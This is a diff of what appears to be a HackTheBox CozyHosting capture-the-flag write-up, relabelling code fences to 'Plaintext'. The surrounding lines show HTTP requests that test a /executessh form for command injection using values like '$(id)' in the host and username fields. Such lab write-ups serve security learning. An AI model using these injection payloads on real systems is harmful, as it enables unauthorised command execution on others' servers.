@@ -64,7 +64,7 @@ And a form for ssh connections, I suppose.
 
 As the form is running ssh, we should find out if we can find command injection. Let's analyze a normal behavior first.
 
-```Request
+```Plaintext
 
 POST /executessh HTTP/1.1
 Host: cozyhosting.htb
@@ -83,7 +83,7 @@ host=test&username=test
 
 ```
 
-```Response
+```Plaintext
 
 HTTP/1.1 302 
 Server: nginx/1.18.0 (Ubuntu)
@@ -102,7 +102,7 @@ X-Frame-Options: DENY
 
 Let's examine the host parameter. we can use ``id`` or `$(id)`
 
-```Request
+```Plaintext
 
 POST /executessh HTTP/1.1
 Host: cozyhosting.htb
@@ -121,7 +121,7 @@ host=$(id)&username=test
 
 ```
 
-```Response
+```Plaintext
 
 HTTP/1.1 302 
 Server: nginx/1.18.0 (Ubuntu)
@@ -139,7 +139,7 @@ X-Frame-Options: DENY
 ```
 Gave invalid. Let's try the username parameter now.
 
-```Request
+```Plaintext
 
 POST /executessh HTTP/1.1
 Host: cozyhosting.htb
@@ -158,7 +158,7 @@ host=test&username=$(id)
 
 ```
 
-```Response
+```Plaintext
 
 HTTP/1.1 302 
 Server: nginx/1.18.0 (Ubuntu)
